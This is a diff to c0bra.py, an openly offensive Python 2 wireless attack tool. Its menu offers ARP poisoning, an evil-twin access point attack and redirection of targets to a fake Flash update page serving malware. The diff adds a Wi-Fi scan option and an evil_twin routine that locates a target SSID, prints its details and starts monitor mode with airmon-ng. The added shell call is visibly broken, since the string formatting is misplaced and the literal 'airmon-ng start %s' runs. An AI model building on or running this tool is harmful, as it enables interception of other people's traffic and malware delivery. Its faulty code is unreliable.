@@ -2,6 +2,7 @@
 
 from wifi import Cell, Scheme
 from colored import fg, attr
+from subprocess import *
 from scapy.all import *
 import netifaces
 import getpass
@@ -131,7 +132,8 @@ def help():
 1) --live-hosts                                  = scan network for live hosts
 2) --arp-poisoning <TARGET> <PLUGIN> <INTERFACE> = arp poisoning attack
 3) --evil-twin <NETWORK_SSID> <INTERFACE>        = evil twin attack
-4) --rediect-flash <target> <maleware>           = rediect to fake flash update page 
+4) --networks-scan <INTERFACE>                   = scan for wifi networks
+5) --rediect-flash <target> <maleware>           = rediect to fake flash update page 
 
 \t%s ARP POISONING ARGUMENTS:
 \t -n = none
@@ -158,14 +160,23 @@ def check_arguments():
 			
 			arp_poisoning(target, target_mac, gateway_mac, plugin, interface)
 		except IndexError:
-			print("%s USAGE : ./c0bra.py <TARGET> <PLUGIN> <INTERFACE>") % RED_ICON
+			print("%s USAGE : ./c0bra.py --arp-poisoning <TARGET> <PLUGIN> <INTERFACE>") % RED_ICON
 
 	elif sys.argv[1] == "--networks-scan":
 		try:
 			interface = sys.argv[2]
 			network_scan(interface)
 		except IndexError:
-			print("%s USAGE : ./c0bra.py <INTERFACE>") % RED_ICON
+			print("%s USAGE : ./c0bra.py --networks-scan <INTERFACE>") % RED_ICON
+
+	elif sys.argv[1] == "--evil-twin":
+		try:
+			network_ssid = sys.argv[2]
+			interface    = sys.argv[3]
+			
+			evil_twin(network_ssid, interface)
+		except IndexError:
+			print("%s USAGE : ./c0bra.py --evil-twin <NETWORK_SSID> <INTERFACE>") % RED_ICON
 
 	elif sys.argv[1] == "--help":
 		help()
@@ -210,6 +221,53 @@ def network_scan(interface):
 	print("%s NETWORKS FOUND %s") % (GREEN_ICON, len(networks))
 	
 	
+def evil_twin(network_ssid, interface):
+	#CHECK NETWORK
+	networks = Cell.all(interface)
+	
+	for network in networks:
+		if network_ssid == network.ssid:
+			print("%s NETWORK FOUND") % GREEN_ICON
+			print("%s NETORK INFORMATIONS :") % BLUE_ICON
+			clone_network(network, interface)
+			
+	print("%s NETWORK NOT FOUND") % RED_ICON 
+	sys.exit(1)
+
+
+def clone_network(network, interface):
+	print("%s SSID   : %s") % (BLUE_ICON, network.ssid)
+	print("%s BSSID  : %s") % (BLUE_ICON, network.address)
+	print("%s SIGNAL : %s") % (BLUE_ICON, network.signal)
+	print("%s ENC    : %s") % (BLUE_ICON, network.encryption_type)
+	print("%s CH     : %s") % (BLUE_ICON, network.channel)
+	print("%s MODE   : %s") % (BLUE_ICON, network.mode)
+
+
+	
+	while 1:
+		question = raw_input("\n[?] start attack?[y/n] : ")
+		
+		if question == "n":
+			print("%s EXIT") % RED_ICON
+			sys.exit(1)
+			
+		elif question == "y":
+			print("%s STARTING ATTACK") % BLUE_ICON
+			print("%s ENABLING MONITOR MODE") % BLUE_ICON 
+						
+			try: # MONITOR MODE
+				call("airmon-ng start %s", shell = True, stdout=open(os.devnull, 'wb')) % interface
+				sys.exit(1)
+			except TypeError:
+				pass
+			
+		else:
+			print("%s ERROR : TYPE 'y' or 'n'") % RED_ICON
+	
+	sys.exit(1)
+
+
 #####################
 ### PROGRAM START ###
 #####################
